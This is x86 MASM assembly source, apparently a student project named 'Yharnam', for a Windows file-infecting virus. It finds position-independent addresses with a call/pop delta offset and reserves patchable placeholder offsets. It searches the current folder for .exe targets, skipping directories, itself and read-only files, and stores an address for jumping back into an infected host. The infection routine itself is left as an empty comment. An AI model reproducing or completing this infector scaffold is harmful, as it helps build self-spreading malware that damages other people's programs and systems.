; Yharnam
;
; Made by:
;
; 	- alexandre.paillier@epitech.eu
;
	
.386
.model flat, stdcall
option casemap:none

      include \masm32\include\windows.inc
      include \masm32\include\kernel32.inc

      includelib \masm32\lib\kernel32.lib

.data
	currentExe			DWORD 0
	fileFilter  		BYTE ".\*.exe",0
	fileStruct	 		DWORD 0
	fileSearchHandle	HANDLE 0
	targetName			DWORD 0

.code

data:
; offsets to the stack pointer
	currentExe_			DWORD 0AAAAAAAAh
	fileFilter_  		DWORD 0BBBBBBBBh
	fileStruct_	 		DWORD 0CCCCCCCCh;(fileFilter_ + (sizeof BYTE) * 8) ; ".\*.exe"
	fileSearchHandle_	DWORD 0DDDDDDDDh;(fileStruct_ + sizeof WIN32_FIND_DATA)
	targetName_			DWORD 0EEEEEEEEh;(fileSearchHandle_ + sizeof HANDLE)
	returnAddr			DWORD 000000000h

start:
	call _getAddr_ ; get the injected .exe's environment instruction pointer
_getAddr_:
	pop ebx
	; (call instruction + (start label address - data label instruction))
	sub ebx, (5 + (start - data))

	sub esp, MAX_PATH ; allocate on the stack for two strings of size MAX_PATH each
	mov currentExe, esp
	sub esp, MAX_PATH
	mov targetName, esp
	sub esp, sizeof WIN32_FIND_DATA  ; and for a WIN32_FIND_DATA struct
	mov fileStruct, esp

	invoke GetModuleFileName, NULL, currentExe, MAX_PATH ; get current .exe full file path
	invoke FindFirstFile, offset fileFilter, fileStruct	
	cmp eax, INVALID_HANDLE_VALUE
	je loop_find_file_end
	mov fileSearchHandle, eax
loop_find_file:
	; check file and put it on the stack if needed
	mov eax, [fileStruct]
	add eax, (fileStruct.WIN32_FIND_DATA.cFileName - fileStruct.WIN32_FIND_DATA)
	invoke GetFullPathName, eax, MAX_PATH, targetName, NULL ; get absolute file path
	
	mov eax, [fileStruct]  ; check if it's a directory
	add eax, (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)
	mov eax, [eax]
	and eax, FILE_ATTRIBUTE_DIRECTORY
	cmp eax, FILE_ATTRIBUTE_DIRECTORY
	je loop_find_file_skip

	invoke lstrcmp, currentExe, targetName ; check if this is the program
	cmp eax, 0
	je loop_find_file_skip

	mov eax, [fileStruct] ; check if it's a read-only file
	add eax, (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)
	mov eax, [eax]
	and eax, FILE_ATTRIBUTE_READONLY
	cmp eax, FILE_ATTRIBUTE_READONLY
	je loop_find_file_skip

;	injection
;

loop_find_file_skip:
	invoke FindNextFile, DWORD ptr ds:[fileSearchHandle], fileStruct	
	cmp eax, TRUE
	je loop_find_file
loop_find_file_end:

	mov eax, [ebx + (returnAddr - data)]
	cmp eax, 0
	jne return_to_exec
	invoke ExitProcess, 0
return_to_exec:
	jmp eax

end start